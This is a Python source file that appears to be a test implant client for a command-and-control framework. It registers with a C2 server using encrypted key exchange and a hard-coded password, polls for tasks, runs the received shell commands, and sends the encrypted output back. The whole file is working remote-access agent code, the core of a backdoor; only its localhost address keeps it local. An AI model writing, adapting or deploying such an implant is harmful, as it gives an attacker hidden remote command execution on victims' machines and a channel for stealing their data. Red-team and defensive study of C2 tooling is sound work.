import subprocess
import requests
from maliketh.crypto.ec import *
from nacl.secret import SecretBox
import json
from pprint import pprint
import time
import base64

BASE = "http://localhost/c2"
REGISTER = BASE + "/register"
CHECKIN = BASE + "/checkin"
TASK_RESULTS = BASE + "/task"
SLEEP_TIME = 5
REG_PWD = b"IhylxF8CXAauMoJGuSoF0VEVl4nwTEhw"


def register():
    sk, pk = generate_b64_ecc_keypair()

    # Encrypt pk with password
    box = SecretBox(REG_PWD)
    encrypted = box.encrypt(pk.encode("utf-8"), encoder=Base64Encoder).decode("utf-8")

    print({"txid": encrypted})
    r = requests.post(REGISTER, json={"txid": encrypted})
    parsed = json.loads(r.text)
    print(f"Response:")
    pprint(parsed)
    print("Decrypted config:")
    decrypted = json.loads(decrypt_b64(parsed["k"], sk, parsed["c"]))
    config = decrypted["config"]
    print(json.dumps(decrypted, indent=2))

    print(f'We are using ID: {decrypted["id"]}')
    print(f'Using cookie name: {config["cookie"]}')

    while True:
        time.sleep(SLEEP_TIME)
        # Get next task
        r = requests.get(CHECKIN, cookies={config["cookie"]: decrypted["id"]})
        if r.status_code != 200:
            print("Error, server returned non-200 status code")
            continue
        job = json.loads(r.text)
        if job:
            if job["opcode"] == 1:
                # Execute shell command and return output
                cmd = " ".join(job["args"])
                print(f"Executing command: {cmd}")
                output = base64.b64encode(
                    subprocess.check_output(cmd, shell=True)
                ).decode("utf-8")
                jsond = json.dumps(
                    {"status": True, "tid": job["task_id"], "output": output}
                ).encode("utf-8")
                body = encrypt_b64str(parsed["k"], sk, jsond)
                print(body)

                # Send output back to server
                r = requests.post(
                    TASK_RESULTS, data=body, cookies={config["cookie"]: decrypted["id"]}
                )
                print(f"Response: {r.text}")


if __name__ == "__main__":
    register()
